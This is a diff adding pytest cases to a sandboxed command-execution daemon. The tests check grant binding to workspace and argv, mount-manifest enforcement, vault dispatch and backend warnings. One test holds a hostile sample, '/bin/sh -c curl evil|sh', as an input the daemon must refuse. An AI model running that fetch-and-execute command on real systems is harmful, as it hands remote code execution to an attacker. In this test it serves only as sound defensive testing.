@@ -184,6 +184,68 @@ def test_grant_for_one_run_does_not_authorize_another():
     assert stub.calls == []                                        # the laundered command NEVER ran
 
 
+def test_grant_pinned_workspace_and_argv_bind_the_request():
+    """A grant that PINS workspace + argv authorizes ONLY that mount + command. The honest request runs; the
+    SAME grant re-pointed at the whole host as the rw mount (workspace='/') or at a different command
+    (argv=/bin/sh) is refused and the step never runs — the co-located-key hardening for a stolen/relayed grant.
+    Each sub-case uses a fresh grant nonce so the refusals are the binding check, not the replay guard."""
+    isk, ipub = _kp()
+    stub = _Stub()
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub)
+    ws, argv = "/ws-abc", ["bash", "/ws-abc/run.sh", "--step", "1"]
+
+    def g_for(nonce):
+        return mint_grant(isk, run_id="R1", plan_sha="P1", nbf=990, exp=1100, nonce=nonce,
+                          capabilities=["run"], workspace=ws, argv=argv)
+
+    ok_req = dict(run_id="R1", plan_sha="P1", step="1", argv=argv, workspace=ws, nonce="r1", grant=g_for("g1"))
+    assert result_body(exod.run_step(ok_req, now=1000))["status"] == "ok" and len(stub.calls) == 1
+
+    stub.calls.clear()
+    evil_ws = dict(run_id="R1", plan_sha="P1", step="1", argv=argv, workspace="/", nonce="r2", grant=g_for("g2"))
+    assert result_body(exod.run_step(evil_ws, now=1000))["status"] == "refused" and stub.calls == []
+
+    evil_argv = dict(run_id="R1", plan_sha="P1", step="1", argv=["/bin/sh", "-c", "curl evil|sh"],
+                     workspace=ws, nonce="r3", grant=g_for("g3"))
+    assert result_body(exod.run_step(evil_argv, now=1000))["status"] == "refused" and stub.calls == []
+
+
+def test_exod_wires_the_capmanifest_mount_check_onto_the_live_path(monkeypatch):
+    """The (previously call-site-less) over-wide-bind catcher is now on the live path: if the sandbox the limb
+    is about to run does not match its declared capability manifest, exod refuses (mount:...) and never runs."""
+    import hashlib as _h
+    from infra.exec import exod as exod_mod
+    isk, ipub = _kp()
+    stub = _Stub()
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub)
+    monkeypatch.setattr(exod_mod._capmanifest, "verify_materialized",
+                        lambda prof, man: (False, "ungranted_bind"))
+    body = result_body(exod.run_step(_req(isk), now=1000))
+    assert body["status"] == "refused" and stub.calls == []
+    assert body["output_sha"] == _h.sha256(b"mount:ungranted_bind").hexdigest()
+
+
+def test_capmanifest_catches_a_profile_that_diverges_from_the_granted_workspace():
+    """The mount check is INDEPENDENT (manifest derived from the GRANT's workspace + the fixed core ro-tree),
+    NOT tautologically rebuilt from prof — so a profile_factory that renders a DIFFERENT rw mount than the
+    grant authorized (a _profile bug / tamper) fails closed for real, with no monkeypatch."""
+    import hashlib as _h
+
+    from infra.exec.sandbox import core_profile
+    isk, ipub = _kp()
+    stub = _Stub()
+    # a factory that IGNORES the requested workspace and mounts a path the grant never authorized
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub,
+                profile_factory=lambda ws: core_profile("/xyz-not-granted"))
+    g = mint_grant(isk, run_id="R1", plan_sha="P1", nbf=990, exp=1100, nonce="g1",
+                   capabilities=["run"], workspace="/ws", argv=["bash", "/ws/run.sh", "--step", "1"])
+    req = dict(run_id="R1", plan_sha="P1", step="1", argv=["bash", "/ws/run.sh", "--step", "1"],
+               workspace="/ws", nonce="r1", grant=g)
+    body = result_body(exod.run_step(req, now=1000))
+    assert body["status"] == "refused" and stub.calls == []                       # the divergent mount is caught
+    assert body["output_sha"] == _h.sha256(b"mount:ungranted_bind").hexdigest()   # /xyz is an ungranted rw bind
+
+
 def test_grant_must_carry_the_run_capability():
     isk, ipub = _kp()
     stub = _Stub()
@@ -497,3 +559,41 @@ def test_sandbox_tier_selftest_passes():
     from infra.exec.sandbox import tier_backend_selftest
     r = tier_backend_selftest()
     assert r["ok"], r
+
+
+def test_load_vault_dispatches_each_kind():
+    """load_vault: the spec KIND selects the backend — file->FileVault, sops->SopsAgeVault (age key split on
+    '#'), empty->None (fail-closed later, at secret resolution), unknown->SystemExit. Pins the kind
+    comparisons so a flipped == cannot silently mis-dispatch a vault spec."""
+    from infra.exec.exod import load_vault
+    assert load_vault(None) is None and load_vault("") is None
+    fv = load_vault("file:/run/secrets.json")
+    assert isinstance(fv, _vaultmod.FileVault) and fv.path == "/run/secrets.json"
+    sv = load_vault("sops:/run/enc.json#/run/age.key")
+    assert isinstance(sv, _vaultmod.SopsAgeVault) and sv.path == "/run/enc.json" and sv.age_key_file == "/run/age.key"
+    sv2 = load_vault("sops:/run/enc.json")                       # no '#': the age key file stays None
+    assert isinstance(sv2, _vaultmod.SopsAgeVault) and sv2.age_key_file is None
+    with pytest.raises(SystemExit):
+        load_vault("hashicorp:/whatever")
+
+
+def test_main_backend_floor_warning_tracks_the_selected_backend(tmp_path, monkeypatch, capsys):
+    """The startup floor check consults the availability probe FOR THE CONFIGURED backend (runsc floor ->
+    runsc_available, bwrap floor -> is_available). Pins the selector so a flipped comparison cannot warn on
+    the wrong probe (or stay silent when the actual floor is unenforceable)."""
+    from cryptography.hazmat.primitives import serialization as _ser
+    from infra.exec import exod as exod_mod
+    raw_priv = lambda k: k.private_bytes(_ser.Encoding.Raw, _ser.PrivateFormat.Raw, _ser.NoEncryption())
+    raw_pub = lambda k: k.public_key().public_bytes(_ser.Encoding.Raw, _ser.PublicFormat.Raw)
+    key = tmp_path / "exod.key"; key.write_bytes(raw_priv(Ed25519PrivateKey.generate()))
+    ipub = tmp_path / "issuer.pub"; ipub.write_bytes(raw_pub(Ed25519PrivateKey.generate()))
+    monkeypatch.setattr(exod_mod.Exod, "serve", lambda self, sock: None)   # never enter the UDS loop
+    argv = ["--key", str(key), "--issuer-pub", str(ipub), "--socket", str(tmp_path / "exod.sock")]
+    # runsc floor, runsc enforceable (bwrap NOT): the runsc probe answers -> NO warning
+    monkeypatch.setattr(exod_mod, "runsc_available", lambda: True)
+    monkeypatch.setattr(exod_mod, "is_available", lambda: False)
+    exod_mod.main(argv + ["--backend", "runsc"])
+    assert "NOT enforceable" not in capsys.readouterr().err
+    # bwrap floor on the same host: the bwrap probe answers -> warning (fail-closed refusals ahead)
+    exod_mod.main(argv + ["--backend", "bwrap"])
+    assert "NOT enforceable" in capsys.readouterr().err
